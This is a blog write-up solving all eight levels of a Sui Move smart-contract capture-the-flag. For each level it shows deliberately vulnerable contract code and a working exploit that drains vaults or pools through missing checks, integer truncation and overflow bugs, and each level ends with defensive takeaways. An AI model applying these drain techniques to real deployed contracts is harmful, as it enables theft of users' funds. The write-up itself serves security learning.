---
layout: post
title: "OZ's Move-over CTF"
date: 2026-05-29
tags: [move, sui, ctf, smart-contracts, security]
in_archive: false
---

<details>
<summary><strong>Table of Contents</strong></summary>
<ul>
<li><a href="#a-quick-note-on-sui-move-vs-aptos-move">Sui Move vs Aptos Move</a></li>
<li><a href="#level-1-artifact-warm-up">Level 1: Artifact</a></li>
<li><a href="#level-2-coin-collector-easy">Level 2: Coin Collector</a></li>
<li><a href="#level-3-sticky-treasure-easy">Level 3: Sticky Treasure</a></li>
<li><a href="#level-4-flash-vault-easy">Level 4: Flash Vault</a></li>
<li><a href="#level-5-pool-party-medium">Level 5: Pool Party</a></li>
<li><a href="#level-6-tick-tock-medium">Level 6: Tick Tock</a></li>
<li><a href="#level-7-mailbox-medium">Level 7: Mailbox</a></li>
<li><a href="#level-8-night-ledger-hard">Level 8: Night Ledger</a></li>
</ul>
</details>

I've been deep in the Aptos/Supra ecosystem for a while now. Resources live in accounts, you pass around `&signer`, and `move_to` is your best friend. It's a specific mental model and once it clicks, you feel pretty comfortable with Move as a language. Then I heard about [Move Over](https://moveover.openzeppelin.com), a Sui Move CTF by OpenZeppelin and thought how different can it be? It's still Move, right?

Turns out, different enough. This is a writeup of all 8 levels.

---

## A Quick Note on Sui Move vs Aptos Move

Understanding the object model is necessary before anything else here.

**Aptos Move:** Resources live inside accounts. You call `move_to(signer, resource)` and that's where it lives. One entry function per transaction.

**Sui Move:** Everything is an object. Objects have a `UID`, live independently on-chain, and get passed around by value or reference. No `signer`; you get `TxContext` instead. Transactions are PTBs (Programmable Transaction Blocks), meaning you can chain multiple Move calls in one transaction, passing outputs of one into inputs of the next.

PTBs turn out to be very relevant for some of these challenges. Let's get into it.

---

## Level 1: Artifact (Warm-up)

**Difficulty: Easy**

<details>
<summary>artifact.move</summary>
<pre><code class="language-rust">module move_over::artifact;

public struct Artifact has key {
    id: UID,
    power: u64,
}

public struct ArtifactFlag has copy, drop {}

public fun forge(ctx: &amp;mut TxContext): Artifact {
    Artifact {
        id: object::new(ctx),
        power: 0,
    }
}

public fun charge(artifact: &amp;mut Artifact, energy: u64) {
    artifact.power = artifact.power + energy;
}

public fun shatter(artifact: Artifact): ArtifactFlag {
    let Artifact { id, power } = artifact;
    assert!(power == 100, 0);
    id.delete();
    ArtifactFlag {}
}</code></pre>
</details>

No tricks here. This is a warm-up to get comfortable with Sui's object model. Forge, charge to 100, shatter.

One thing to note coming from Aptos: you need `let mut artifact` because you're passing `&mut artifact` to `charge`. Move's borrow checker requires the binding to be declared mutable.

### Solution

<pre><code class="language-rust">public fun run(t: &amp;mut tx_context::TxContext): artifact::ArtifactFlag {
    let mut artifact = artifact::forge(t);
    artifact::charge(&amp;mut artifact, 100);
    artifact::shatter(artifact)
}</code></pre>

**Takeaway:** `&mut T` = borrow mutably. `T` (no reference) = consume. The type signatures tell you exactly what each function can do before you read the body.

---

## Level 2: Coin Collector (Easy)

<details>
<summary>coin_collector.move</summary>
<pre><code class="language-rust">module move_over::coin_collector;

public struct Token has key, store {
    id: UID,
    value: u64,
}

public struct CoinCollectorFlag has copy, drop {}

public fun faucet(ctx: &amp;mut TxContext): Token {
    Token { id: object::new(ctx), value: 100 }
}

public fun split(token: &amp;mut Token, amount: u64, ctx: &amp;mut TxContext): Token {
    assert!(token.value >= amount, 0);
    token.value = token.value - amount;
    Token { id: object::new(ctx), value: amount }
}

public fun merge(token: &amp;mut Token, other: Token) {
    let Token { id, value } = other;
    id.delete();
    token.value = token.value + value;
}

public fun buy_prize(payment: Token): CoinCollectorFlag {
    let Token { id, value: _ } = payment;
    id.delete();
    CoinCollectorFlag {}
}

public fun value(token: &amp;Token): u64 {
    token.value
}

public fun destroy_zero(token: Token) {
    assert!(token.value == 0, 0);
    let Token { id, value: _ } = token;
    id.delete();
}</code></pre>
</details>

"Supposed to cost 1,000." Let's find where that check actually lives.

`buy_prize` destructures the token with `value: _`; the field is immediately discarded. **The function never reads it.** The 1,000 cost exists only in the description, not in the code.

### Solution

<pre><code class="language-rust">public fun run(t: &amp;mut tx_context::TxContext): coin_collector::CoinCollectorFlag {
    let token = coin_collector::faucet(t);
    coin_collector::buy_prize(token)
}</code></pre>

**Takeaway:** A function's behavior is only what the code enforces. Always check which assertions actually exist and which fields are bound to `_`. This shows up in real audits constantly.

---

## Level 3: Sticky Treasure (Easy)

<details>
<summary>sticky_treasure.move</summary>
<pre><code class="language-rust">module move_over::sticky_treasure;

use sui::dynamic_field as df;

public struct Chest has key {
    id: UID,
}

public struct Prize has store, copy, drop {
    value: u64,
}

public struct StickyTreasureFlag has copy, drop {}

public fun create(ctx: &amp;mut TxContext): Chest {
    let mut chest = Chest { id: object::new(ctx) };
    df::add(&amp;mut chest.id, b"prize", Prize { value: 1000 });
    chest
}

public fun smash(chest: Chest): Prize {
    let Chest { id } = chest;
    id.delete();
    Prize { value: 0 }
}

public fun has_prize(chest: &amp;Chest): bool {
    df::exists_(&amp;chest.id, b"prize")
}

public fun extract_prize(chest: &amp;mut Chest): Prize {
    df::remove(&amp;mut chest.id, b"prize")
}

public fun discard(chest: Chest) {
    let Chest { id } = chest;
    id.delete();
}

public fun solve(prize: Prize): StickyTreasureFlag {
    assert!(prize.value == 1000, 0);
    StickyTreasureFlag {}
}</code></pre>
</details>

Points to note:
- `smash` silently creates a new `Prize { value: 0 }` and discards the real one stored in the dynamic field
- `solve` checks `prize.value == 1000`, so the smash path fails
- `extract_prize` pulls the real dynamic field out intact
- After extracting the prize, the chest still exists with no contents, so you have to explicitly `discard` it since it has no `drop` ability

### Solution

<pre><code class="language-rust">public fun run(t: &amp;mut tx_context::TxContext): sticky_treasure::StickyTreasureFlag {
    let mut chest = sticky_treasure::create(t);
    let prize = sticky_treasure::extract_prize(&amp;mut chest);
    let flag = sticky_treasure::solve(prize);
    sticky_treasure::discard(chest);
    flag
}</code></pre>

**Takeaway:** In Sui, `dynamic_field` lets you attach data to an object at runtime; it doesn't show up in the struct definition. Always scan for `df::add` and `df::remove` calls to understand what's actually stored. Every `public fun` is callable by anyone. Names don't gate access.

---

## Level 4: Flash Vault (Easy)

<details>
<summary>flash_vault.move</summary>
<pre><code class="language-rust">module move_over::flash_vault;

public struct Token has key, store {
    id: UID,
    value: u64,
}

public struct FlashVault has key {
    id: UID,
    balance: u64,
    next_nonce: u64,
}

/// No abilities — must be consumed within the transaction.
public struct Receipt {
    vault_id: ID,
    borrower: address,
    nonce: u64,
    amount: u64,
}

public struct FlashVaultFlag has copy, drop {}

const VAULT_LIQUIDITY: u64 = 1_000;

const EZERO_AMOUNT: u64 = 0;
const EINSUFFICIENT_LIQUIDITY: u64 = 1;
const EWRONG_VAULT: u64 = 2;
const EWRONG_BORROWER: u64 = 3;
const ENONCE_MISMATCH: u64 = 4;
const EINSUFFICIENT_REPAYMENT: u64 = 5;
const ENOT_DRAINED: u64 = 6;

public fun create_vault(ctx: &amp;mut TxContext): FlashVault {
    FlashVault { id: object::new(ctx), balance: VAULT_LIQUIDITY, next_nonce: 1 }
}

public fun borrow(vault: &amp;mut FlashVault, amount: u64, ctx: &amp;mut TxContext): (Token, Receipt) {
    assert!(amount > 0, EZERO_AMOUNT);
    assert!(vault.balance >= amount, EINSUFFICIENT_LIQUIDITY);
    let nonce = vault.next_nonce;
    vault.balance = vault.balance - amount;
    vault.next_nonce = nonce + 1;
    (
        Token { id: object::new(ctx), value: amount },
        Receipt { vault_id: object::id(&amp;vault.id), borrower: ctx.sender(), nonce, amount },
    )
}

public fun repay(vault: &amp;mut FlashVault, receipt: Receipt, payment: Token, ctx: &amp;TxContext) {
    let Receipt { vault_id, borrower, nonce, amount } = receipt;
    assert!(vault_id == object::id(&amp;vault.id), EWRONG_VAULT);
    assert!(borrower == ctx.sender(), EWRONG_BORROWER);
    assert!(nonce + 1 == vault.next_nonce, ENONCE_MISMATCH);
    assert!(payment.value >= amount, EINSUFFICIENT_REPAYMENT);
    let Token { id, value } = payment;
    id.delete();
    vault.balance = vault.balance + value;
}

public fun cancel(vault: &amp;mut FlashVault, receipt: Receipt, ctx: &amp;TxContext) {
    let Receipt { vault_id, borrower, nonce, amount: _ } = receipt;
    assert!(vault_id == object::id(&amp;vault.id), EWRONG_VAULT);
    assert!(borrower == ctx.sender(), EWRONG_BORROWER);
    assert!(nonce + 1 == vault.next_nonce, ENONCE_MISMATCH);
}

public fun solve(vault: FlashVault): FlashVaultFlag {
    assert!(vault.balance == 0, ENOT_DRAINED);
    let FlashVault { id, balance: _, next_nonce: _ } = vault;
    id.delete();
    FlashVaultFlag {}
}</code></pre>
</details>

`Receipt` has no abilities at all, not even `drop`. This is the **hot potato** pattern. You must explicitly consume it. Two paths: `repay` (restores balance) or `cancel` (consumes receipt, **ignores `amount: _`**, vault stays drained).

The remaining problem: you still have a loose `Token` (`key, store`, no `drop`). Calling `repay` would restore the vault. But in Sui, **any object with `store` can be transferred**. Send the token to yourself; it leaves your scope without touching any contract logic.

### Solution

<pre><code class="language-rust">public fun run(t: &amp;mut tx_context::TxContext): flash_vault::FlashVaultFlag {
    let mut vault = flash_vault::create_vault(t);
    let (token, receipt) = flash_vault::borrow(&amp;mut vault, 1000, t);

    // Transfer token to ourselves -- consumed without restoring vault balance
    sui::transfer::public_transfer(token, tx_context::sender(t));

    flash_vault::cancel(&amp;mut vault, receipt, t);
    flash_vault::solve(vault)
}</code></pre>

**Takeaway:** Hot potato enforces *something* consumes the receipt, not that every consumer restores the invariant. `public_transfer` is a valid exit for any `store` object.

---

## Level 5: Pool Party (Medium)

<details>
<summary>pool_party.move</summary>
<pre><code class="language-rust">module move_over::pool_party;

public struct Pool has key {
    id: UID,
    name: vector&lt;u8&gt;,
    balance: u64,
    next_nonce: u64,
    is_treasury: bool,
}

/// No abilities — must be consumed within the transaction.
public struct Receipt {
    pool_id: ID,
    borrower: address,
    nonce: u64,
    amount: u64,
}

public struct PoolPartyFlag has copy, drop {}

const EZERO_AMOUNT: u64 = 0;
const EINSUFFICIENT_LIQUIDITY: u64 = 1;
const EWRONG_BORROWER: u64 = 2;
const ENONCE_MISMATCH: u64 = 3;
const EINSUFFICIENT_REPAYMENT: u64 = 4;
const ENOT_DRAINED: u64 = 5;
const EINVALID_POOL_ID: u64 = 6;
const ENOT_TREASURY: u64 = 7;

public fun create_pool_a(ctx: &amp;mut TxContext): Pool {
    Pool { id: object::new(ctx), name: b"Treasury", balance: 100_000, next_nonce: 3, is_treasury: true }
}

public fun create_pool_b(ctx: &amp;mut TxContext): Pool {
    Pool { id: object::new(ctx), name: b"DryRun", balance: 0, next_nonce: 1, is_treasury: false }
}

public fun create_pool_c(ctx: &amp;mut TxContext): Pool {
    Pool { id: object::new(ctx), name: b"Auxiliary", balance: 10, next_nonce: 2, is_treasury: false }
}

public fun borrow(pool: &amp;mut Pool, amount: u64, ctx: &amp;TxContext): (u64, Receipt) {
    assert!(amount > 0, EZERO_AMOUNT);
    assert!(pool.balance >= amount, EINSUFFICIENT_LIQUIDITY);
    let nonce = pool.next_nonce;
    pool.balance = pool.balance - amount;
    pool.next_nonce = nonce + 1;
    let receipt = Receipt {
        pool_id: object::id(&amp;pool.id),
        borrower: tx_context::sender(ctx),
        nonce,
        amount,
    };
    (amount, receipt)
}

public fun repay(
    pool: &amp;mut Pool,
    receipt_pool_id: ID,
    receipt: Receipt,
    repayment: u64,
    ctx: &amp;TxContext,
) {
    let Receipt { pool_id, borrower, nonce, amount } = receipt;
    assert!(pool_id == receipt_pool_id, EINVALID_POOL_ID);
    assert!(borrower == tx_context::sender(ctx), EWRONG_BORROWER);
    assert!(nonce + 1 == pool.next_nonce, ENONCE_MISMATCH);
    assert!(repayment >= amount, EINSUFFICIENT_REPAYMENT);
    pool.balance = pool.balance + repayment;
}

public fun solve(pool_a: Pool): PoolPartyFlag {
    assert!(pool_a.is_treasury, ENOT_TREASURY);
    assert!(pool_a.balance == 0, ENOT_DRAINED);
    let Pool { id, name: _, balance: _, next_nonce: _, is_treasury: _ } = pool_a;
    id.delete();
    PoolPartyFlag {}
}

public fun destroy_pool(pool: Pool) {
    let Pool { id, name: _, balance: _, next_nonce: _, is_treasury: _ } = pool;
    id.delete();
}

public fun pool_id(pool: &amp;Pool): ID { object::id(&amp;pool.id) }
public fun balance(pool: &amp;Pool): u64 { pool.balance }
public fun next_nonce(pool: &amp;Pool): u64 { pool.next_nonce }</code></pre>
</details>

This one took me the longest. Let's find the bug first, then deal with the nonce puzzle.

### The Bug

Points to note in `repay`:
- `pool` (where money goes) and `receipt_pool_id` (what the receipt belongs to) are **separate arguments with no cross-check** between them
- `assert!(pool_id == receipt_pool_id)` only checks the receipt against the caller-supplied ID, **not** against `object::id(&pool.id)`
- You can borrow from Pool A and repay into Pool B; Pool A stays drained
- But the nonce check `nonce + 1 == pool.next_nonce` blocks a naive attempt. Initial nonces: A=3, B=1, C=2

### Nonce Alignment

Pool A's first receipt has `nonce=3`. We need a target pool at `next_nonce=4`.

Pool C starts at `next_nonce=2`:

<pre><code class="language-plaintext">1. Borrow from Pool C        → next_nonce = 3
2. Repay into Pool C normally → consumed (restoring C's balance is fine)
3. Borrow from Pool C again  → next_nonce = 4
4. Borrow from Pool A (receipt.nonce=3), repay into Pool C (next_nonce=4)
   → nonce check: 3+1 == 4  ✓  Pool A stays drained</code></pre>

The key insight: **restoring Pool C's balance is completely fine**. The only goal is `pool_a.balance == 0`.

### Solution

<pre><code class="language-rust">public fun run(t: &amp;mut tx_context::TxContext): pool_party::PoolPartyFlag {
    let mut pool_a = pool_party::create_pool_a(t);
    let pool_b = pool_party::create_pool_b(t);
    let mut pool_c = pool_party::create_pool_c(t);

    let pool_a_id = pool_party::pool_id(&amp;pool_a);
    let pool_c_id = pool_party::pool_id(&amp;pool_c);

    let (_, receipt_a) = pool_party::borrow(&amp;mut pool_a, 100000, t);

    // Move Pool C nonce: 2 -> 3 -> back -> 3 -> 4
    let (_, receipt_c1) = pool_party::borrow(&amp;mut pool_c, 10, t);
    pool_party::repay(&amp;mut pool_c, pool_c_id, receipt_c1, 10, t);
    let (_, receipt_c2) = pool_party::borrow(&amp;mut pool_c, 1, t);

    // The exploit: repay Pool A's receipt into Pool C
    pool_party::repay(&amp;mut pool_c, pool_a_id, receipt_a, 100000, t);
    pool_party::repay(&amp;mut pool_c, pool_c_id, receipt_c2, 1, t);

    pool_party::destroy_pool(pool_b);
    pool_party::destroy_pool(pool_c);
    pool_party::solve(pool_a)
}</code></pre>

**Takeaway:** When two arguments should logically refer to the same thing, validate them against each other explicitly. Deriving `receipt_pool_id` from `object::id(&pool.id)` instead of accepting it as a caller-supplied parameter would have prevented this entirely.

---

## Level 6: Tick Tock (Medium)

<details>
<summary>tick_tock.move</summary>
<pre><code class="language-rust">module move_over::tick_tock;

public struct Pool has key {
    id: UID,
    total_liquidity: u128,
    token_balance: u64,
}

public struct LiquidityPosition has key, store {
    id: UID,
    liquidity: u128,
}

public struct TickTockFlag has copy, drop {}

const SCALE: u128 = 1 &lt;&lt; 64;

public fun create_pool(ctx: &amp;mut TxContext): Pool {
    Pool { id: object::new(ctx), total_liquidity: 1_000_000, token_balance: 1_000_000 }
}

public fun tick_to_sqrt_price(tick: u64): u128 {
    let shift = (tick / 100) as u8;
    1u128 &lt;&lt; shift
}

public fun add_liquidity(
    pool: &amp;mut Pool,
    deposit: u64,
    liquidity_amount: u128,
    tick: u64,
    ctx: &amp;mut TxContext,
): LiquidityPosition {
    let sqrt_price = tick_to_sqrt_price(tick);
    let cost = (liquidity_amount * sqrt_price) / SCALE;
    assert!((deposit as u128) >= cost, 0);
    pool.token_balance = pool.token_balance + deposit;
    pool.total_liquidity = pool.total_liquidity + liquidity_amount;
    LiquidityPosition { id: object::new(ctx), liquidity: liquidity_amount }
}

public fun remove_liquidity(pool: &amp;mut Pool, position: LiquidityPosition): u64 {
    let LiquidityPosition { id, liquidity } = position;
    id.delete();
    let payout = ((liquidity * (pool.token_balance as u128)) / pool.total_liquidity) as u64;
    assert!(pool.token_balance >= payout, 0);
    pool.token_balance = pool.token_balance - payout;
    pool.total_liquidity = pool.total_liquidity - liquidity;
    payout
}

public fun solve(pool: Pool): TickTockFlag {
    assert!(pool.token_balance &lt;= 100_000, 0);
    let Pool { id, total_liquidity: _, token_balance: _ } = pool;
    id.delete();
    TickTockFlag {}
}</code></pre>
</details>

Let's find the bug in the pricing math.

`tick_to_sqrt_price`: `tick` is `u64` but `shift` is cast to `u8`: **narrowing cast**. For `tick = 0`: `shift = 0`, `sqrt_price = 1`.

In `add_liquidity` with `sqrt_price = 1`:

<pre><code class="language-plaintext">cost = (liquidity_amount * 1) / (1 << 64) = 0</code></pre>

Integer division truncates to zero. We can add a billion liquidity units for free, then remove them for a massive proportional payout. :)

### Solution

<pre><code class="language-rust">public fun run(t: &amp;mut tx_context::TxContext): tick_tock::TickTockFlag {
    let mut pool = tick_tock::create_pool(t);
    let pos = tick_tock::add_liquidity(&amp;mut pool, 0, 1_000_000_000, 0, t);
    let _ = tick_tock::remove_liquidity(&amp;mut pool, pos);
    tick_tock::solve(pool)
}</code></pre>

**Takeaway:** Narrowing casts in Move silently truncate: no `Result`, no abort, no warning. Unlike Rust's `try_into()`, `as u8` just drops the upper bits. Every cast from a wider integer to a narrower one is a potential truncation bug. This exact pattern has appeared in production DEX contracts.

---

## Level 7: Mailbox (Medium)

<details>
<summary>mailbox.move + mailbox_relay.move</summary>
<pre><code class="language-rust">module move_over::mailbox;

use sui::dynamic_object_field as dof;
use move_over::mailbox_relay::{Self, RelayHandle};

const TARGET: u64 = 1_000_000;
const ADMIN: address = @0xAD3171;

const ENO_SUCH_LETTER: u64 = 0;
const ENOT_ENOUGH: u64 = 1;
const EWRONG_RECIPIENT: u64 = 2;

public struct PostOffice has key {
    id: UID,
    indexed: ID,
}

public struct Letter has key, store {
    id: UID,
    addressee: address,
    payload: u64,
}

public struct MailboxFlag has copy, drop {}

public fun open_office(ctx: &amp;mut TxContext): PostOffice {
    let letter = Letter { id: object::new(ctx), addressee: ADMIN, payload: TARGET };
    let letter_id = object::id(&amp;letter.id);
    let mut office = PostOffice { id: object::new(ctx), indexed: letter_id };
    dof::add(&amp;mut office.id, letter_id, letter);
    office
}

/// Direct claim path: only the addressee themselves can pull their letter.
public fun claim(office: &amp;mut PostOffice, letter_id: ID, ctx: &amp;TxContext): Letter {
    assert!(dof::exists_(&amp;office.id, letter_id), ENO_SUCH_LETTER);
    let letter = dof::remove&lt;ID, Letter&gt;(&amp;mut office.id, letter_id);
    assert!(letter.addressee == tx_context::sender(ctx), EWRONG_RECIPIENT);
    letter
}

/// Delegated claim path — trusts a RelayHandle as proof of recipient.
public fun claim_via(office: &amp;mut PostOffice, letter_id: ID, handle: &amp;RelayHandle): Letter {
    assert!(dof::exists_(&amp;office.id, letter_id), ENO_SUCH_LETTER);
    let letter = dof::remove&lt;ID, Letter&gt;(&amp;mut office.id, letter_id);
    assert!(letter.addressee == mailbox_relay::target(handle), EWRONG_RECIPIENT);
    letter
}

public fun next_letter(office: &amp;PostOffice): ID { office.indexed }
public fun payload(letter: &amp;Letter): u64 { letter.payload }
public fun addressee(letter: &amp;Letter): address { letter.addressee }

public fun close_office(office: PostOffice) {
    let PostOffice { id, indexed: _ } = office;
    id.delete();
}

public fun solve(letter: Letter): MailboxFlag {
    let Letter { id, addressee: _, payload } = letter;
    id.delete();
    assert!(payload >= TARGET, ENOT_ENOUGH);
    MailboxFlag {}
}</code></pre>
<pre><code class="language-rust">module move_over::mailbox_relay;

/// Holding a `RelayHandle` with `target = X` is meant to certify that the
/// relay has verified, off-chain, that the holder is authorized to receive
/// mail addressed to `X`. The protocol trusts that promise on-chain.
public struct RelayHandle has key, store {
    id: UID,
    target: address,
}

/// In production this is supposed to follow off-chain KYC of the requester.
/// On-chain, there is no constraint that ties `target` to the caller.
public fun handle_for(target: address, ctx: &amp;mut TxContext): RelayHandle {
    RelayHandle { id: object::new(ctx), target }
}

public fun target(handle: &amp;RelayHandle): address { handle.target }

public fun consume(handle: RelayHandle) {
    let RelayHandle { id, target: _ } = handle;
    id.delete();
}</code></pre>
</details>

A letter is addressed to `ADMIN = @0xAD3171`. The delegated claim path (`claim_via`) trusts a `RelayHandle` as proof of recipient. Let's find where `RelayHandle` is minted.

`handle_for` takes any `target: address` with **no check whatsoever**. Anyone can mint a `RelayHandle` for any address. The `mailbox` module is correctly written; the bug is entirely in `handle_for`.

### Solution

<pre><code class="language-rust">public fun run(t: &amp;mut tx_context::TxContext): mailbox::MailboxFlag {
    let mut po = mailbox::open_office(t);
    let letter_id = mailbox::next_letter(&amp;po);

    let rh = mailbox_relay::handle_for(@0xAD3171, t);
    let letter = mailbox::claim_via(&amp;mut po, letter_id, &amp;rh);

    mailbox_relay::consume(rh);
    mailbox::close_office(po);
    mailbox::solve(letter)
}</code></pre>

**Takeaway:** A capability pattern is only as strong as its weakest minter. Every `mint_*` / `issue_*` / `handle_for` across all modules in scope is part of the attack surface. The runtime checks the type. The minter has to check the identity.

---

## Level 8: Night Ledger (Hard)

<details>
<summary>night_ledger.move + night_ledger_math.move</summary>
<pre><code class="language-rust">module move_over::night_ledger;

use move_over::night_ledger_math;

const EINSUFFICIENT_MARGIN: u64 = 0;
const EMULTIPLICATION_OVERFLOW: u64 = 1;
const EINSUFFICIENT_RESERVE: u64 = 2;
const EINSUFFICIENT_VALUE: u64 = 3;
const EZERO_LIQUIDITY: u64 = 4;
const EINVALID_MARGIN_NOTE: u64 = 5;

const INITIAL_RESERVE: u64 = 25_000_000;
const TARGET_VALUE: u64 = 10_000_000;
const PAYOUT_SHIFT: u8 = 28;

public struct Ledger has key { id: UID, reserve: u64, epoch: u64 }
public struct MarginNote has key, store { id: UID, value: u64 }
public struct Position has key, store { id: UID, liquidity: u128, margin_paid: u64, epoch: u64 }
public struct NightLedgerFlag has copy, drop {}

fun root_price_0(): u128 { 1u128 &lt;&lt; 60 }
fun root_price_1(): u128 { (1u128 &lt;&lt; 60) + (1u128 &lt;&lt; 44) + 17u128 }

public fun bootstrap(ctx: &amp;mut TxContext): Ledger {
    Ledger { id: object::new(ctx), reserve: INITIAL_RESERVE, epoch: 0 }
}

public fun faucet(ctx: &amp;mut TxContext): MarginNote {
    MarginNote { id: object::new(ctx), value: 1 }
}

public fun open_position(
    ledger: &amp;mut Ledger,
    payment: MarginNote,
    liquidity: u128,
    ctx: &amp;mut TxContext,
): Position {
    assert!(liquidity > 0, EZERO_LIQUIDITY);
    let required = required_margin(liquidity);
    let MarginNote { id: payment_id, value } = payment;
    assert!(value == 1, EINVALID_MARGIN_NOTE);
    assert!(value >= required, EINSUFFICIENT_MARGIN);
    payment_id.delete();
    ledger.reserve = ledger.reserve + required;
    let position = Position { id: object::new(ctx), liquidity, margin_paid: required, epoch: ledger.epoch };
    ledger.epoch = ledger.epoch + 1;
    position
}

public fun close_position(ledger: &amp;mut Ledger, position: Position, ctx: &amp;mut TxContext): MarginNote {
    let Position { id, liquidity, margin_paid: _, epoch: _ } = position;
    id.delete();
    let payout = night_ledger_math::payout_from_liquidity(liquidity, PAYOUT_SHIFT);
    assert!(ledger.reserve >= payout, EINSUFFICIENT_RESERVE);
    ledger.reserve = ledger.reserve - payout;
    MarginNote { id: object::new(ctx), value: payout }
}

public fun solve(note: MarginNote): NightLedgerFlag {
    let MarginNote { id, value } = note;
    assert!(value >= TARGET_VALUE, EINSUFFICIENT_VALUE);
    id.delete();
    NightLedgerFlag {}
}

public fun discard_ledger(ledger: Ledger) {
    let Ledger { id, reserve: _, epoch: _ } = ledger;
    id.delete();
}

fun required_margin(liquidity: u128): u64 {
    let (required, overflowing) =
        night_ledger_math::quote_required_margin(root_price_0(), root_price_1(), liquidity, true);
    if (overflowing) { abort EMULTIPLICATION_OVERFLOW };
    required
}</code></pre>
<pre><code class="language-rust">module move_over::night_ledger_math;

const SHIFT_BITS: u8 = 32;
const HIGH_BITS_OFFSET: u8 = 96;

public fun full_mul_u128(a: u128, b: u128): u128 { a * b }

public fun quote_required_margin(
    sqrt_price_0: u128, sqrt_price_1: u128, liquidity: u128, round_up: bool,
): (u64, bool) {
    quote_from_roots(sqrt_price_0, sqrt_price_1, liquidity, round_up)
}

public fun payout_from_liquidity(liquidity: u128, shift: u8): u64 {
    let scaled = (liquidity >> shift) as u64;
    if (scaled == 0) { 1 } else { scaled }
}

fun quote_from_roots(
    sqrt_price_0: u128, sqrt_price_1: u128, liquidity: u128, round_up: bool,
): (u64, bool) {
    let sqrt_price_diff = abs_diff(sqrt_price_0, sqrt_price_1);
    if (sqrt_price_diff == 0 || liquidity == 0) { return (0, false) };
    let (numerator, overflowing) = checked_shlw(full_mul_u128(liquidity, sqrt_price_diff));
    if (overflowing) { return (0, true) };
    let denominator = full_mul_u128(sqrt_price_0, sqrt_price_1);
    let quotient = div_round(numerator, denominator, round_up);
    ((quotient as u64), false)
}

public fun checked_shlw(n: u128): (u128, bool) {
    let mask = 0xffffffffu128 &lt;&lt; HIGH_BITS_OFFSET;
    if (n > mask) { (0, true) } else { (n &lt;&lt; SHIFT_BITS, false) }
}

public fun checked_shlw_strict(n: u128): (u128, bool) {
    let limit = 1u128 &lt;&lt; HIGH_BITS_OFFSET;
    if (n >= limit) { (0, true) } else { (n &lt;&lt; SHIFT_BITS, false) }
}

public fun div_round(numerator: u128, denominator: u128, round_up: bool): u128 {
    let quotient = numerator / denominator;
    let remainder = numerator % denominator;
    if (round_up && remainder > 0) { quotient + 1 } else { quotient }
}

public fun abs_diff(a: u128, b: u128): u128 {
    if (a > b) { a - b } else { b - a }
}</code></pre>
</details>

The final boss. Two chained bugs in fixed-point math. Let's break them down.

### Bug 1: Weak Overflow Guard in `checked_shlw`

<pre><code class="language-rust">public fun checked_shlw(n: u128): (u128, bool) {
    let mask = 0xffffffffu128 &lt;&lt; HIGH_BITS_OFFSET;  // = 2^128 - 2^96
    if (n > mask) { (0, true) }
    else { (n &lt;&lt; SHIFT_BITS, false) }               // no protection against wraparound!
}</code></pre>

The mask catches `n > 2^128 - 2^96`, but `n << 32` can still silently wrap mod 2^128 for values that pass the check. `checked_shlw_strict` in the same file uses the correct limit `2^96`; it's just not used anywhere.

### Bug 2: Silent Truncation on Payout

<pre><code class="language-rust">let scaled = (liquidity >> shift) as u64;  // silent truncation</code></pre>

### Finding the Magic Value

With `liquidity = 2^52`:

<pre><code class="language-plaintext">// Cost path
n = 2^52 * sqrt_price_diff ≈ 2^96
checked_shlw: 2^96 <= 2^128 - 2^96, passes the check
numerator = 2^96 << 32 = 2^128 → wraps to ~0
quotient ≈ 0, round_up → required_margin = 1   ← faucet note covers it

// Payout path
payout = 2^52 >> 28 = 2^24 = 16,777,216 >= 10,000,000  ✓</code></pre>

### Solution

<pre><code class="language-rust">public fun run(t: &amp;mut tx_context::TxContext): night_ledger::NightLedgerFlag {
    let mut ledger = night_ledger::bootstrap(t);
    let note = night_ledger::faucet(t);

    let liquidity = 4503599627370496u128; // 2^52

    let position = night_ledger::open_position(&amp;mut ledger, note, liquidity, t);
    let payout = night_ledger::close_position(&amp;mut ledger, position, t);

    night_ledger::discard_ledger(ledger);
    night_ledger::solve(payout)
}</code></pre>

**Takeaway:** Fixed-point math is a minefield. Every `<<`, `>>`, and integer cast is a potential exploit site. The fact that `checked_shlw_strict` exists right next to the buggy `checked_shlw` and isn't used is a classic sign of an incomplete security review.

---

Thanks for making up until here :)

---

## Not sure from when CTF's started providing certificates

<div style="text-align: center;">
<img src="/assets/images/move-over-ctf-yashwanth-sai-sollu.png" alt="Move Over CTF Certificate" style="max-width: 100%;">
<p>But the stamp looked sus so I had to dig into the source code. Spoiler: it's just FNV-1a hashing of my name twice. Very blockchain aesthetic, very not blockchain.</p>
</div>
